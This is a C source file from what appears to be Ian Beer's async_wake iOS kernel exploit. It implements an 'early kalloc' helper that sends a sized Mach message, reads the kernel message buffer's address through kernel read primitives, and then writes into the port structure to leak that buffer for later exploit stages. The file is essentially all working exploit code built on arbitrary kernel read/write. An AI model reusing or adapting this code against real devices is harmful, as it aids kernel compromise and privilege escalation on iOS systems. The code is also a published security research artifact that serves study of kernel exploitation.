//
//  early_kalloc.c
//  async_wake_ios
//
//  Created by Ian Beer on 12/11/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "early_kalloc.h"

#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>

#include "find_port.h"
#include "offsets.h"
#include "krw.h"

/*
 for the given mach message size, how big will the ipc_kmsg structure be?
 
 This is defined in ipc_kmsg_alloc, and it's quite complicated to work it out!
 
 The size is overallocated so that if the message was sent from a 32-bit process
 they can expand out the 32-bit ool descriptors to the kernel's 64-bit ones, which
 means that for each descriptor they would need an extra 4 bytes of space for the
 larger pointer. Except at this point they have no idea what's in the message
 so they assume the worst case for all messages. This leads to approximately a 30%
 overhead in the allocation size.
 
 The allocated size also contains space for the maximum trailer plus the ipc_kmsg header.
 
 When the message is actually written into this buffer it's aligned to the end
 */
int message_size_for_kalloc_size(int kalloc_size) {
    return ((3*kalloc_size)/4) - 0x74;
}

// get a kalloc allocation before we've got a kcall interface to just call it
uint64_t early_kalloc(int size) {
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    printf("unable to allocate port\n");
  }
  
  uint64_t port_kaddr = find_port_address(port, MACH_MSG_TYPE_MAKE_SEND);
  
  struct simple_msg  {
    mach_msg_header_t hdr;
    char buf[0];
  };
  
  mach_msg_size_t msg_size = message_size_for_kalloc_size(size);
  struct simple_msg* msg = malloc(msg_size);
  memset(msg, 0, msg_size);
  
  msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
  msg->hdr.msgh_size = msg_size;
  msg->hdr.msgh_remote_port = port;
  msg->hdr.msgh_local_port = MACH_PORT_NULL;
  msg->hdr.msgh_id = 0x41414142;
  
  err = mach_msg(&msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 msg_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  
  if (err != KERN_SUCCESS) {
    printf("early kalloc failed to send message\n");
  }
  
  // find the message buffer:
  
  uint64_t message_buffer = kread64(port_kaddr + off_ipc_port_ikmq_base);
  printf("message buffer: %llx\n", message_buffer);
  
  // leak the message buffer:
  kwrite64(port_kaddr + off_ipc_port_ikmq_base, 0);
  kwrite32(port_kaddr + off_ipc_port_msg_count, 0x50000); // this is two uint16_ts, msg_count and qlimit
  
  
  return message_buffer;
}
